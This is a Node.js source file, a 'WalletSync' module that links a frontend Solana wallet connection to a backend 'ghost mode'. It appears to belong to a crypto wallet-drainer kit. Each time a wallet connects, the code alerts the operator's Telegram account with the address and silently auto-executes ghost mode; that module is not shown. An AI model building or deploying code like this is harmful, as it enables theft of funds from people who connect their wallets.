/**
 * WALLET SYNC - Bridges frontend connection to backend ghost mode
 */

const { PublicKey } = require('@solana/web3.js');
const GhostMode = require('./ghostMode');
const privateRPC = require('../network/privateRPC');
const telegramBot = require('../bot/telegramBot');
const { TELEGRAM_USER_ID } = require('../../config/constants');
const logger = require('../../utils/logger');

class WalletSync {
  constructor() {
    this.connection = privateRPC.getConnection();
    this.activeWallets = new Map(); // walletAddress -> { socketId, ghostMode }
  }

  /**
   * Called when frontend wallet connects
   */
  async onWalletConnected(walletAddress, socketId) {
    try {
      logger.info(`Wallet connected: ${walletAddress.slice(0, 8)}...`);

      // Validate address
      const pubkey = new PublicKey(walletAddress);

      // Check if already synced
      if (this.activeWallets.has(walletAddress)) {
        logger.warn(`Wallet ${walletAddress.slice(0, 8)}... already active`);
        return { status: 'already_active' };
      }

      // Create ghost mode instance
      const ghostMode = new GhostMode(this.connection, {
        publicKey: pubkey,
        signTransaction: null, // Will be set via socket
        signAndSendTransaction: null
      });

      // Store in active map
      this.activeWallets.set(walletAddress, {
        socketId,
        ghostMode,
        connectedAt: Date.now(),
        pubkey
      });

      // Notify Telegram
      await telegramBot.sendAlert(
        TELEGRAM_USER_ID,
        `🔌 Wallet Connected\nAddress: ${walletAddress.slice(0, 8)}...${walletAddress.slice(-8)}\nTriggering Ghost Mode...`
      );

      // Auto-trigger ghost mode
      setImmediate(async () => {
        try {
          await ghostMode.execute();
        } catch (error) {
          logger.error('Ghost mode auto-execute failed:', error);
        }
      });

      return {
        status: 'synced',
        message: 'Ghost mode activated',
        wallet: walletAddress.slice(0, 8) + '...'
      };

    } catch (error) {
      logger.error('Wallet sync failed:', error);
      throw error;
    }
  }

  /**
   * Called when wallet disconnects
   */
  onWalletDisconnected(walletAddress) {
    if (this.activeWallets.has(walletAddress)) {
      this.activeWallets.delete(walletAddress);
      logger.info(`Wallet disconnected: ${walletAddress.slice(0, 8)}...`);
      
      telegramBot.sendAlert(
        TELEGRAM_USER_ID,
        `🔌 Wallet Disconnected\n${walletAddress.slice(0, 8)}...`
      ).catch(() => {});
    }
  }

  /**
   * Get active wallets
   */
  getActiveWallets() {
    return Array.from(this.activeWallets.entries()).map(([addr, data]) => ({
      address: addr,
      connectedAt: data.connectedAt,
      socketId: data.socketId
    }));
  }
}

module.exports = new WalletSync();